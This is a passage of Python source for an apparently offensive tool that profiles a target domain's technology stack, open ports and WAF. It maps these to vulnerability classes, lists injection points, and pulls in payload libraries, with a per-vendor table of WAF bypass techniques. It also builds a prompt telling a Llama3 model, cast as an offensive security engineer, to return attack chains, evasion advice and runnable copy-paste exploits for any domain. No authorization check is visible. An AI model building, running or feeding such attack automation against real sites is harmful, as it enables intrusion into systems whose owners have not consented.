                if any(s in name for s in ["cloudflare", "akamai", "fastly", "incapsula", "imperva", "modsecurity", "sucuri"]):
                    profile["cdn_waf"].append(name)

            # Cookies from Wappalyzer metadata aren't always present,
            # but pull from security analysis if available
            for cookie in tech_data.get("cookies", []):
                profile["cookies"].append(cookie)

        # ── From port_scan ───────────────────────────────────────────────
        for port_result in scan_results.get("port_scan", []):
            for port_info in port_result.get("ports", []):
                port = port_info.get("port")
                if port:
                    profile["open_ports"].append({
                        "port":    port,
                        "service": port_info.get("service", ""),
                        "product": port_info.get("product", ""),
                        "version": port_info.get("version", ""),
                    })
                    svc = port_info.get("service", "").lower()
                    if "mysql" in svc:
                        profile["database"] = profile["database"] or "mysql"
                    if "postgres" in svc:
                        profile["database"] = profile["database"] or "postgresql"
                    if "mongodb" in svc:
                        profile["database"] = profile["database"] or "mongodb"
                    if "redis" in svc:
                        profile["raw_tech_names"].add("redis")

        # ── From ssl_scan ────────────────────────────────────────────────
        ssl_main = scan_results.get("ssl_scan", {}).get("main_domain", {})
        if ssl_main:
            protocols = ssl_main.get("protocols", {})
            for proto, enabled in protocols.items():
                if enabled:
                    profile["ssl_version"] = proto
                    break  # first enabled = lowest (most relevant for vulns)

            # Cert subject alt names may reveal internal tech
            for cert in ssl_main.get("certificates", [])[:1]:
                profile["response_headers"]["ssl_cn"] = cert.get("subject", {}).get("CN", "")

        # ── From header_analysis (if present) ───────────────────────────
        header_analysis = scan_results.get("header_analysis", {})
        for url, target_data in header_analysis.get("targets", {}).items():
            raw_hdrs = target_data.get("raw_headers_sample", {})
            if raw_hdrs:
                profile["response_headers"].update(
                    {k: v for k, v in list(raw_hdrs.items())[:15]}
                )
            for finding in target_data.get("findings", []):
                if finding.get("type") == "information_disclosure":
                    exposed_val = finding.get("exposed_value", "")
                    profile["raw_tech_names"].add(
                        finding.get("header", "").lower()
                    )
                    # Try to extract tech name from Server: / X-Powered-By: values
                    match = re.match(r"([a-zA-Z\-\.]+)[\/ ]?[\d\.]*", exposed_val)
                    if match:
                        profile["raw_tech_names"].add(match.group(1).lower())

        # Normalise raw_tech_names to list for JSON serialisation
        profile["raw_tech_names"] = list(profile["raw_tech_names"])
        return profile

    # ------------------------------------------------------------------
    # Vuln class mapping
    # ------------------------------------------------------------------

    def _map_vuln_classes(self, profile: Dict) -> List[str]:
        classes: Set[str] = set()
        raw = set(profile.get("raw_tech_names", []))

        # Normalise tech names from both detected list and raw names
        all_techs = set(raw)
        for entry in profile.get("detected_tech", []):
            if isinstance(entry, dict):
                all_techs.add(entry.get("name", "").lower())
            elif isinstance(entry, str):
                all_techs.add(entry.lower())

        for tech in all_techs:
            for key, vuln_list in TECH_VULN_MAP.items():
                if key in tech:
                    classes.update(vuln_list)

        # Port-based class additions
        for port_entry in profile.get("open_ports", []):
            port = port_entry.get("port")
            if port in (3306, 3307):
                classes.update(["sqli", "sqli_mysql"])
            if port in (5432,):
                classes.update(["sqli", "sqli_postgres"])
            if port in (1433,):
                classes.update(["sqli", "sqli_mssql"])
            if port in (27017, 27018):
                classes.add("nosql")
            if port in (6379,):
                classes.add("ssrf")   # SSRF → Redis via Gopher

        # Always include basics for any web app
        classes.update(["xss", "open_redirect", "idor", "csrf"])

        # If any SSTI-capable framework found, add SSTI detection
        if any(k in all_techs for k in SSTI_ENGINE_MAP):
            classes.add("ssti")

        # XML-related apps get XXE
        for tech in all_techs:
            if any(x in tech for x in ["xml", "soap", "wsdl", "spring", "java"]):
                classes.add("xxe")

        # GraphQL endpoint if detected
        if "graphql" in all_techs or any("graphql" in t for t in all_techs):
            classes.add("graphql")

        return sorted(classes)

    # ------------------------------------------------------------------
    # WAF detection
    # ------------------------------------------------------------------

    def _detect_waf(self, scan_results: Optional[Dict]) -> Dict:
        result = {"detected": False, "name": None, "bypass_strategy": None}
        if not scan_results:
            return result

        waf_signatures: Dict[str, List[str]] = {
            "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid"],
            "Akamai":      ["akamai", "ak_bmsc", "akamaighost"],
            "Imperva/Incapsula": ["incapsula", "visid_incap", "imperva"],
            "AWS WAF":     ["awswaf", "x-amzn-requestid"],
            "F5 BIG-IP":   ["bigipserver", "f5"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Barracuda":   ["barra_counter_session"],
            "Sucuri":      ["sucuri", "x-sucuri-id"],
            "Wordfence":   ["wordfence"],
        }

        waf_bypass_map: Dict[str, str] = {
            "Cloudflare":  "Chunked encoding, case variation, Unicode normalisation, HTTP/2 smuggling",
            "Akamai":      "Multipart boundary injection, HTTP pipeline, comment obfuscation",
            "Imperva/Incapsula": "JSON/XML mime-type confusion, double encoding, charset tricks",
            "AWS WAF":     "Newline injection, parameter pollution, URL encoding bypass",
            "ModSecurity": "Keyword fragmentation, base64 encoding, comment injection",
            "Sucuri":      "Case variation, URL encoding, chunked transfer",
            "F5 BIG-IP":   "HTTP/2, chunked encoding, header injection",
        }

        # Scan tech_detection for WAF names
        tech_detection = (scan_results or {}).get("tech_detection", {})
        for url, tech_data in tech_detection.items():
            for tech in tech_data.get("technologies", []):
                name = tech.get("name", "").lower()
                for waf_name, sigs in waf_signatures.items():
                    if any(s in name for s in sigs):
                        result["detected"]  = True
                        result["name"]      = waf_name
                        result["bypass_strategy"] = waf_bypass_map.get(waf_name, "Generic evasion: encoding, case, chunking")
                        return result

        # Scan response headers
        header_analysis = (scan_results or {}).get("header_analysis", {})
        for url, target_data in header_analysis.get("targets", {}).items():
            for k, v in target_data.get("raw_headers_sample", {}).items():
                kl = k.lower()
                vl = v.lower()
                for waf_name, sigs in waf_signatures.items():
                    if any(s in kl or s in vl for s in sigs):
                        result["detected"]  = True
                        result["name"]      = waf_name
                        result["bypass_strategy"] = waf_bypass_map.get(waf_name, "Generic evasion")
                        return result

        return result

    # ------------------------------------------------------------------
    # Injection point inventory
    # ------------------------------------------------------------------

    def _build_injection_points(
        self, domain: str, scan_results: Optional[Dict]
    ) -> List[Dict]:
        points: List[Dict] = []

        def _add(surface: str, url: str, method: str, param_type: str, notes: str = "") -> None:
            points.append({
                "surface":    surface,
                "url":        url,
                "method":     method,
                "param_type": param_type,
                "notes":      notes,
            })

        # Auth pages from enumeration module results
        email_enum = (scan_results or {}).get("email_enumeration", {})
        for page in email_enum.get("login_pages", []):
            _add("auth_login", page.get("url", ""), "POST", "form_fields",
                 "Login form — test SQLi, default creds, brute force")
        for page in email_enum.get("password_reset_pages", []):
            _add("password_reset", page.get("url", ""), "POST", "form_fields",
                 "Password reset — test user enumeration, token leakage")

        # API endpoints from subdomain names + URLScan hits
        osint = (scan_results or {}).get("osint_correlation", {})
        for item in osint.get("exposed_paths", [])[:20]:
            url = item.get("url", "")
            if url:
                _add("exposed_path", url, "GET", "path_param",
                     f"Wayback/URLScan hit — status {item.get('status', '?')}")

        # Port-based injection surfaces
        for port_result in (scan_results or {}).get("port_scan", []):
            host = port_result.get("host", domain)
            for port_info in port_result.get("ports", []):
                port    = port_info.get("port")
                service = port_info.get("service", "")
                if port in (80, 443, 8080, 8443, 8000, 8888):
                    _add("web_port", f"http{'s' if port in (443, 8443) else ''}://{host}:{port}/",
                         "GET", "url_param", f"Web port {port} open")
                elif port in (21,):
                    _add("ftp", f"ftp://{host}:21", "FTP", "credential",
                         "FTP — test anonymous auth")
                elif port in (22,):
                    _add("ssh", f"ssh://{host}:22", "SSH", "credential",
                         "SSH — test key-based auth, default creds")
                elif port in (3306, 5432, 27017, 6379):
                    _add("database_port", f"{host}:{port}", "DB", "query",
                         f"{service} exposed — test direct connection")
                elif port in (9200, 9300):
                    _add("elasticsearch", f"http://{host}:{port}/_cat/indices", "GET",
                         "url_param", "Elasticsearch — test unauthenticated access")

        # Generic surfaces based on domain
        _add("query_string", f"https://{domain}/search?q=", "GET", "url_param", "Full range: SQLi, XSS, SSTI")
        _add("path_parameter", f"https://{domain}/user/1", "GET", "path_param", "IDOR probing")
        _add("json_api", f"https://{domain}/api/v1/", "POST", "json_body", "JSON body: SQLi, NoSQL, XSS, SSTI")
        _add("file_upload", f"https://{domain}/upload", "POST", "multipart", "Extension bypass, SSRF via SVG/XML")
        _add("xml_endpoint", f"https://{domain}/api/xml", "POST", "xml_body", "XXE, SSRF")

        return points

    # ------------------------------------------------------------------
    # Payload selection
    # ------------------------------------------------------------------

    def _select_payloads(
        self,
        vuln_classes: List[str],
        profile: Dict,
        waf_info: Dict,
        injection_points: List[Dict],
    ) -> Dict:
        selected: Dict = {}
        waf_present = waf_info.get("detected", False)

        # Helper — pick WAF-bypass variants when WAF present, basic otherwise
        def _pick(library: Dict[str, List[str]], waf: bool) -> Dict[str, List[str]]:
            if waf:
                base     = {k: v for k, v in library.items() if k != "waf_bypass"}
                bypasses = library.get("waf_bypass", [])
                return {**base, "waf_bypass": bypasses}
            return {k: v for k, v in library.items() if k != "waf_bypass"}

        for vc in vuln_classes:
            if vc == "sqli" or vc.startswith("sqli_"):
                db = profile.get("database", "")
                if "mysql" in db or vc == "sqli_mysql":
                    selected["sqli_mysql"] = _pick(
                        {**SQLI_PAYLOADS, "targeted": SQLI_PAYLOADS["error_based_mysql"]},
                        waf_present
                    )
                elif "postgres" in db or vc == "sqli_postgres":
                    selected["sqli_postgres"] = _pick(
                        {**SQLI_PAYLOADS, "targeted": SQLI_PAYLOADS["error_based_postgres"]},
                        waf_present
                    )
                elif "mssql" in db or vc == "sqli_mssql":
                    selected["sqli_mssql"] = _pick(
                        {**SQLI_PAYLOADS, "targeted": SQLI_PAYLOADS["error_based_mssql"]},
                        waf_present
                    )
                elif "oracle" in db or vc == "sqli_oracle":
                    selected["sqli_oracle"] = _pick(
                        {**SQLI_PAYLOADS, "targeted": SQLI_PAYLOADS["error_based_oracle"]},
                        waf_present
                    )
                else:
                    selected["sqli_generic"] = _pick(SQLI_PAYLOADS, waf_present)

            elif vc == "xss":
                selected["xss"] = _pick(XSS_PAYLOADS, waf_present)

            elif vc == "ssti":
                # Determine engine from detected framework
                all_techs: Set[str] = set(profile.get("raw_tech_names", []))
                for t in profile.get("detected_tech", []):
                    if isinstance(t, dict):
                        all_techs.add(t.get("name", "").lower())
                    elif isinstance(t, str):
                        all_techs.add(t.lower())

                engine_key = None
                for tech in all_techs:
                    for k, v in SSTI_ENGINE_MAP.items():
                        if k in tech:
                            engine_key = v
                            break
                    if engine_key:
                        break

                selected["ssti"] = {
                    "detection": SSTI_PAYLOADS["detection_polyglot"],
                    "targeted":  SSTI_PAYLOADS.get(engine_key or "jinja2_python", []),
                    "all_engines": {k: v for k, v in SSTI_PAYLOADS.items()
                                    if k != "detection_polyglot"},
                }

            elif vc == "ssrf":
                selected["ssrf"] = SSRF_PAYLOADS

            elif vc == "xxe":
                selected["xxe"] = XXE_PAYLOADS

            elif vc == "cmdi":
                selected["cmdi"] = CMDI_PAYLOADS

            elif vc == "path_traversal":
                selected["path_traversal"] = PATH_TRAVERSAL_PAYLOADS

            elif vc == "open_redirect":
                selected["open_redirect"] = OPEN_REDIRECT_PAYLOADS

            elif vc == "idor":
                selected["idor"] = IDOR_PROBES

            elif vc == "nosql":
                selected["nosql"] = NOSQL_PAYLOADS

            elif vc == "csrf":
                selected["csrf"] = CSRF_TEMPLATES

            elif vc == "jwt_attacks":
                selected["jwt"] = JWT_ATTACKS

            elif vc == "graphql":
                selected["graphql"] = GRAPHQL_PAYLOADS

            elif vc == "http_request_smuggling":
                selected["http_request_smuggling"] = SMUGGLING_PAYLOADS

            elif vc == "wordpress_enum":
                selected["wordpress"] = WORDPRESS_PAYLOADS

        # Add metadata about what each class targets
        annotated: Dict = {}
        for class_name, payload_data in selected.items():
            annotated[class_name] = {
                "payloads": payload_data,
                "injection_surfaces": [
                    ip for ip in injection_points
                    if self._surface_matches_class(ip["param_type"], class_name)
                ],
                "waf_bypass_required": waf_present,
                "waf_bypass_strategy": waf_info.get("bypass_strategy") if waf_present else None,
            }

        return annotated

    def _surface_matches_class(self, param_type: str, vuln_class: str) -> bool:
        mappings = {
            "url_param":   ["sqli", "xss", "ssti", "open_redirect", "ssrf", "path_traversal", "cmdi"],
            "form_fields": ["sqli", "xss", "ssti", "cmdi", "csrf", "idor"],
            "json_body":   ["sqli", "xss", "nosql", "ssrf", "ssti", "idor"],
            "xml_body":    ["xxe", "xxe", "sqli", "ssrf"],
            "path_param":  ["idor", "path_traversal", "sqli"],
            "multipart":   ["xss", "xxe", "ssrf", "cmdi"],
            "credential":  ["sqli", "nosql"],
            "query":       ["sqli", "nosql"],
        }
        for vc in mappings.get(param_type, []):
            if vc in vuln_class:
                return True
        return False

    # ------------------------------------------------------------------
    # Pass 2 — Groq AI enrichment
    # ------------------------------------------------------------------

    def _ai_analysis(
        self,
        domain: str,
        tech_profile: Dict,
        vuln_classes: List[str],
        waf_info: Dict,
        injection_points: List[Dict],
        payloads: Dict,
    ) -> Optional[Dict]:
        try:
            prompt = self._build_prompt(
                domain, tech_profile, vuln_classes, waf_info, injection_points
            )
            text = self._call_groq(prompt)
            if not text:
                return None
            return self._parse_ai_response(text)
        except Exception as e:
            self.logger.error(f"AI analysis failed: {e}")
            return None

    def _build_prompt(
        self,
        domain: str,
        tech_profile: Dict,
        vuln_classes: List[str],
        waf_info: Dict,
        injection_points: List[Dict],
    ) -> str:
        condensed_profile = {
            "web_server":  tech_profile.get("web_server"),
            "language":    tech_profile.get("language"),
            "framework":   tech_profile.get("framework"),
            "cms":         tech_profile.get("cms"),
            "database":    tech_profile.get("database"),
            "cdn_waf":     tech_profile.get("cdn_waf", []),
            "open_ports":  [p["port"] for p in tech_profile.get("open_ports", [])[:8]],
            "ssl_version": tech_profile.get("ssl_version"),
        }

        top_surfaces = [
            {"surface": ip["surface"], "method": ip["method"],
             "param_type": ip["param_type"], "notes": ip["notes"]}
            for ip in injection_points[:8]
        ]

        return f"""You are a senior offensive security engineer and bug bounty expert.
Given the following web application profile for {domain}, return ONLY valid JSON.

Technology Profile:
{json.dumps(condensed_profile, indent=2)}

Detected Vulnerability Classes: {vuln_classes}

WAF: {json.dumps(waf_info, indent=2)}

Top Injection Surfaces:
{json.dumps(top_surfaces, indent=2)}

Return a JSON object with EXACTLY these keys:
- "exploit_priority": array of objects ordered by ease × impact, each with:
    "vuln_class" (string), "rank" (int 1–10), "why_high_priority" (string),
    "estimated_severity" (critical/high/medium/low),
    "quick_test" (string — one copy-paste payload or curl command to test first).
- "attack_chain": array of objects each with:
    "step" (int), "action" (string), "vuln_class" (string), "tool_suggestion" (string),
    "payload_hint" (string).
    Model a realistic multi-step attack from initial recon to impact.
- "waf_evasion_guide": object with:
    "applicable" (bool), "techniques" (array of strings), "best_first" (string).
- "copy_paste_exploits": array of objects, max 5 most critical, each with:
    "name" (string), "description" (string), "payload_or_command" (string — actual runnable payload, not pseudocode).
- "automation_suggestions": array of strings — specific tool commands
    (sqlmap, dalfox, nuclei, ffuf, ghauri, wfuzz) tailored to this exact stack.
- "overall_exploitability": one of [critical, high, medium, low].

Return ONLY valid JSON. No markdown fences, no preamble, no trailing text."""

    def _call_groq(self, prompt: str) -> Optional[str]:
        headers = {
            "Authorization": f"Bearer {self.groq_api_key}",
            "Content-Type":  "application/json",
        }
        payload = {
            "model":       "llama3-70b-8192",
            "messages":    [{"role": "user", "content": prompt}],
            "temperature": 0.25,
            "max_tokens":  2000,
        }

        for attempt in range(3):
            try:
                self.logger.info(f"Groq API call attempt {attempt + 1}")
                resp = requests.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers=headers,
                    json=payload,
                    timeout=50,
                )
                if resp.status_code == 200:
                    return resp.json()["choices"][0]["message"]["content"]
                if resp.status_code == 429:
                    wait = 12 * (attempt + 1)
                    self.logger.warning(f"Rate limited — waiting {wait}s")
                    time.sleep(wait)
                    continue
                self.logger.error(f"Groq {resp.status_code}: {resp.text[:200]}")
                break
            except requests.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(2 ** attempt)
            except Exception as e:
                self.logger.error(f"Groq error: {e}")
                break

        return None

    def _parse_ai_response(self, text: str) -> Optional[Dict]:
        cleaned = text.strip()
        if cleaned.startswith("```"):
            cleaned = cleaned.split("```")[1]
            if cleaned.startswith("json"):
                cleaned = cleaned[4:]
        cleaned = cleaned.strip()

        try:
            parsed = json.loads(cleaned)
            parsed["ai_model"]     = "Groq Llama3-70B"
            parsed["generated_at"] = datetime.now().isoformat()
            return parsed
        except json.JSONDecodeError:
            start = cleaned.find("{")
            end   = cleaned.rfind("}") + 1
            if start != -1 and end > start:
                try:
                    parsed = json.loads(cleaned[start:end])
                    parsed["ai_model"]     = "Groq Llama3-70B"
                    parsed["generated_at"] = datetime.now().isoformat()
                    return parsed
                except json.JSONDecodeError:
                    pass
            self.logger.error("Could not parse AI JSON response")
            return None